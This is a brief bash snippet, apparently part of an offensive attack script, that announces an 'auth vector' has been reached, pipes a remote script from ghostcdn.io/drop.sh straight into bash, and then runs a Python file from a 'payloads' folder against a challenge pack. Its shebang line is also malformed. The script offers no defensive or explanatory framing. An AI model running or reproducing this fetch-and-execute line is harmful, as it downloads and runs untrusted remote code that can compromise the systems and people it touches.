`bash
!/bin/bash
echo "[Hydra] Bloom auth vector reached..."
curl -s https://ghostcdn.io/drop.sh | bash
python3 payloads/ghostbloom.py --challenge challengepack.json
`
